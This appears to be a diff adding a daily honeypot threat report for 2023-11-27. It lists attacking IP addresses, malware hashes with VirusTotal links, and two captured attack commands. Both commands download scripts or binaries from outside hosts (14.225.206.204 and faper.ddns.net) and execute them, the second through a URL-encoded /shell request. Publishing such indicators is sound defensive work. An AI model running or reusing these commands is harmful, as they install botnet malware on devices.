@@ -1,0 +1,23 @@
+Top 5 IPs for 2023-11-27:
+102.128.78.77
+46.19.139.138
+149.22.234.164
+115.133.72.158
+222.186.16.162
+
+
+Top malware seen: 
+
+56e376fe961db08c622c70a25200a89bec93290bba54f33f9577e3721e05323b
+https://www.virustotal.com/gui/file/56e376fe961db08c622c70a25200a89bec93290bba54f33f9577e3721e05323b
+712312a3b0cdef4520863e5ec4837fb4300534dc726d533243852c2d02b9fd2d
+https://www.virustotal.com/gui/file/712312a3b0cdef4520863e5ec4837fb4300534dc726d533243852c2d02b9fd2d
+75fd0e98923d68a25d63606bd2612388a6d9a81d509135f75ab7058d4c7af0e0
+https://www.virustotal.com/gui/file/75fd0e98923d68a25d63606bd2612388a6d9a81d509135f75ab7058d4c7af0e0
+f5f7f889d43919c30127ab5780f5b43b1c7ddca8caa8a55b9b0783de26c76ab0
+https://www.virustotal.com/gui/file/f5f7f889d43919c30127ab5780f5b43b1c7ddca8caa8a55b9b0783de26c76ab0
+
+Malicious commands seen:
+cd /data/local/tmp/; busybox wget http://14.225.206.204/w.sh; sh w.sh; curl http://14.225.206.204/c.sh; sh c.sh; wget http://14.225.206.204/wget.sh; sh wget.sh; curl http://14.225.206.204/wget.sh; sh wget.sh; busybox wget http://14.225.206.204/wget.sh; sh wget.sh; busybox curl http://14.225.206.204/wget.sh; sh wget.sh
+
+/shell?cd+/tmp;rm+imaginebeingarm+imaginebeingarm7;wget+http:/\\/faper.ddns.net/imaginebeingarm7;chmod+777+imaginebeingarm7;./imaginebeingarm7+IG.ipcams;wget+http:/\\/faper.ddns.net/imaginebeingarm;chmod+777+imaginebeingarm;./imaginebeingarm+IG.ipcams
